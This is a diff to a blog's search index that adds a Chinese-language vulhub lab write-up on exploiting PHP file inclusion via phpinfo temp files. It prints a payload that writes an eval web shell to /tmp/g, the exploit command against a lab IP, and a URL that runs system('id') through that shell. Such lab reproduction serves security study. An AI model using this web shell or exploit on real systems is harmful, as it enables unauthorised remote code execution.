@@ -4,6 +4,39 @@
   
     
     <entry>
+      <title>PHP文件包含漏洞(利用phpinfo)</title>
+      <link href="/2022/05/06/php-inclusion/"/>
+      <url>/2022/05/06/php-inclusion/</url>
+      
+        <content type="html"><![CDATA[<h1 id="PHP文件包含漏洞"><a href="#PHP文件包含漏洞" class="headerlink" title="PHP文件包含漏洞"></a>PHP文件包含漏洞</h1><h2 id="漏洞简述"><a href="#漏洞简述" class="headerlink" title="漏洞简述"></a>漏洞简述</h2><blockquote><p>PHP文件包含漏洞中，如果找不到可以包含的文件，我们可以通过包含临时文件的方法来getshell。因为临时文件名是随机的，如果目标网站上存在phpinfo，则可以通过phpinfo来获取临时文件名，进而进行包含。</p></blockquote><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><pre class=" language-Linux"><code class="language-Linux">cd /vulhub/php/inclusiondocker-compose up -d</code></pre><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>利用脚本实现<a href="https://github.com/vulhub/vulhub/blob/master/php/inclusion/exp.py">https://github.com/vulhub/vulhub/blob/master/php/inclusion/exp.py</a></p><p>成功包含临时文件后，会执行<code>&lt;?php file_put_contents(&#39;/tmp/g&#39;, &#39;&lt;?=eval($_REQUEST[1])?&gt;&#39;)?&gt;</code>，写入一个新文件<code>/tmp/g</code></p><p>命令执行</p><pre class=" language-Linux"><code class="language-Linux">python exp.py 192.168.3.151 8080 100</code></pre><p><img src="/2022/05/06/php-inclusion/image-20220506085858719.png" alt="image-20220506085858719"></p><p>执行成功后打开网页看看</p><pre><code>http://192.168.3.151:8080/lfi.php?file=/tmp/g&amp;1=system(&#39;id&#39;);</code></pre><p><img src="/2022/05/06/php-inclusion/image-20220506090059840.png" alt="image-20220506090059840"></p><p>结束！</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 漏洞复现 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 环境搭建 </tag>
+            
+            <tag> 漏洞复现 </tag>
+            
+            <tag> 网络安全 </tag>
+            
+            <tag> vulhub </tag>
+            
+            <tag> PHP </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>PHP-FPM Fastcgi未授权访问漏洞</title>
       <link href="/2022/05/05/php-fpm-fastcgi/"/>
       <url>/2022/05/05/php-fpm-fastcgi/</url>
@@ -25,8 +58,6 @@
             <tag> 漏洞复现 </tag>
             
             <tag> 网络安全 </tag>
-            
-            <tag> CVE </tag>
             
             <tag> vulhub </tag>
             
